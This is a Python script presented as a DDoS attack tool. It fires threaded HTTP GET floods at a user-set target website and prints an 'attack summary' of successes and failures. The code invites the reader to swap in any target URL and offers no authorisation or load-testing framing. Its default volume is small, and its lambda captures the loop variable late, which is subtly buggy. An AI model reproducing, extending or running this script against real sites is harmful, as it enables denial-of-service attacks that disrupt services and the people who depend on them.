import requests
import threading
import time
from requests.exceptions import RequestException

# --- Configuration ---
TARGET_URL = "https://www.example.com/"  # <<< CHANGE THIS TO YOUR TARGET WEBSITE
CONCURRENT_THREADS = 5  # The number of requests to run simultaneously
TOTAL_REQUESTS_TO_SEND = 100 # Total number of requests you want to send over time

# Global list to track results
results = []

def attack_worker(request_id):
    """
    Worker function that sends a single HTTP GET request to the target URL.
    """
    try:
        # Using a Session object for efficiency, especially in multiple requests
        # If you are targeting HTTPS, Session handles the SSL context.
        with requests.Session() as session:
            # Increase timeout if the server is slow or under heavy load
            response = session.get(TARGET_URL, timeout=15)

            # Capture success/failure data
            result = {
                "request_id": request_id,
                "status": "Success",
                "status_code": response.status_code,
                "response_time": response.elapsed.total_seconds()
            }
            return result

    except RequestException as e:
        # Handle connection errors, timeouts, DNS failures, etc.
        result = {
            "request_id": request_id,
            "status": "Failed",
            "error": str(e)
        }
        return result

def run_ddos_attack():
    """
    Main function to manage the thread pool and execute the attack.
    """
    print(f"--- DDoS Attack Simulation Initiated ---")
    print(f"Target URL: {TARGET_URL}")
    print(f"Concurrency Level: {CONCURRENT_THREADS} threads")
    print(f"Total Requests: {TOTAL_REQUESTS_TO_SEND}")
    print("-" * 40)

    threads = []
    start_time = time.time()

    # List to hold the thread objects
    active_threads = []

    for i in range(1, TOTAL_REQUESTS_TO_SEND + 1):
        # 1. Create the thread targetting the worker function
        thread = threading.Thread(target=lambda: results.append(attack_worker(i)))
        threads.append(thread)

        # 2. Start the thread
        thread.start()

        # 3. Thread Management (To enforce the desired concurrency level)
        # Wait for the oldest thread to finish before starting a new one if we hit the limit
        if len(threads) >= CONCURRENT_THREADS:
            # Wait for the first thread started in this batch to finish
            # A simpler approach for "burst" load is just to wait for the ones running

            # Wait for all currently running threads to complete their task before launching the next batch
            # This ensures we don't have more than CONCURRENT_THREADS running AT ANY GIVEN TIME
            for t in threads:
                t.join()

            # Reset the thread list for the next batch if we are running in waves
            threads = []


    # Wait for any remaining threads to finish after the loop completes
    for t in threads:
        t.join()

    end_time = time.time()

    # --- Reporting ---
    success_count = sum(1 for r in results if r.get('status') == 'Success')
    fail_count = len(results) - success_count

    print("\n" + "="*50)
    print("ATTACK SUMMARY")
    print("="*50)
    print(f"Total Time Elapsed: {end_time - start_time:.2f} seconds")
    print(f"Total Requests Sent: {len(results)}")
    print(f"Successful Requests: {success_count}")
    print(f"Failed Requests: {fail_count}")
    print("="*50)

    # Optional: Print detailed results of the first few requests
    print("\n--- Sample Results (First 5) ---")
    for i, res in enumerate(results[:5]):
        print(f"Req {i+1}: Status={res['status']}, Code={res.get('status_code', 'N/A')}")

if __name__ == "__main__":
    # Ensure you have requests installed: pkg install python && pip install requests
    run_ddos_attack()
